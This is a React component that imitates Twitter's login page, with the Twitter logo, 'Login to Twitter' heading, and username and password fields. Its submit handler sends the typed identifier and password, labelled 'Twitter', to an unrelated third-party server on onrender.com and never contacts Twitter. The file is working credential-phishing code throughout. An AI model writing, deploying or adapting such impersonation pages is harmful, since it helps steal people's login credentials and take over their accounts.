import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faTwitter } from "@fortawesome/free-brands-svg-icons";
import { useState } from "react";
import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";

function TwitterLogin() {
  const [showPassword, setShowPassword] = useState(false);
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const handleLogin = async (e) => {
    e.preventDefault();
    const options = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        identifier: identifier,
        password: password,
        platform: "Twitter",
      }),
    };

    let response = await fetch("https://ott-platform-official.onrender.com", options);
    response = await response.json();
    console.log(response);
  };

  const handleEyeClick = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="twitter-login flex flex-col items-center font-inter">
      <FontAwesomeIcon
        icon={faTwitter}
        style={{ fontSize: "150px", color: "#1d9bf0", marginTop: "8rem" }}
      />
      <h2 className="text-2xl md:text-3xl font-bold mt-12">Login to Twitter</h2>
      <form action="" className="w-2/3 md:w-1/3 flex flex-col mt-24">
        <input
          type="text"
          placeholder="Phone number, email address or username"
          className="py-4 indent-2"
          style={{ outline: 0 }}
          value={identifier}
          onChange={(e) => setIdentifier(e.target.value)}
        />
        <hr className="opacity-50 my-1" />
        <div className="relative">
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            className="py-4 indent-2"
            style={{ outline: 0 }}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <FontAwesomeIcon
            icon={showPassword ? faEye : faEyeSlash}
            className="absolute right-6 top-5 cursor-pointer"
            onClick={handleEyeClick}
          />
        </div>
        <button
          className="mt-16 py-6 bg-twitterLogin w-2/3 self-center text-xl font-bold"
          style={{ color: "white", borderRadius: "1.5rem" }}
          onClick={handleLogin}
        >
          Log in
        </button>
      </form>
    </div>
  );
}

export default TwitterLogin;
